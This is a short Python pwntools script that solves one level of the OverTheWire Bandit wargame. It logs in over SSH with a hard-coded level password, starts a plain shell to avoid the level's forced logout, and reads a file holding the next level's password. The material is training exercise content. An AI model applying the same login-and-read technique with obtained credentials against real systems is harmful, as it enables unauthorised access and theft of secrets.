from pwn import *

user = "bandit18"
password = "kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd"
host = "bandit.labs.overthewire.org"
port = 2220

shell = ssh(user, host, password=password, port=port)
sh = shell.run('sh')
sh.sendline("cat readme")
log.success("The Password for Bandit19 === " + sh.recvline().decode("utf-8"))
sh.close()

